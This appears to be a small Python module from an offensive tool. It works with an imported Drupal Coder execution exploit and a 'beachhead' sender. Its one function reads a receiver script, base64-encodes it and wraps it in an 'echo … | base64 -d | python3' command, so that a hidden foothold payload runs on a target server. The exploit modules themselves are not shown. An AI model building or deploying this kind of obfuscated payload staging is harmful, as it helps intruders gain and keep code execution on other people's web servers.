from include.BeachheadSender import BeachheadSender
from include.DrupalCoderExec import DrupalCoderExec

from base64 import b64encode


BEACHHEAD_LOCATION = 'include/BeachheadReceiver.py'

def package_beachhead():
    with open(BEACHHEAD_LOCATION, 'r') as f:
        receiver = f.read()
    b64_beachhead = b64encode(receiver.encode('utf-8')).decode('utf-8')
    return "echo " + b64_beachhead + " | base64 -d | python3"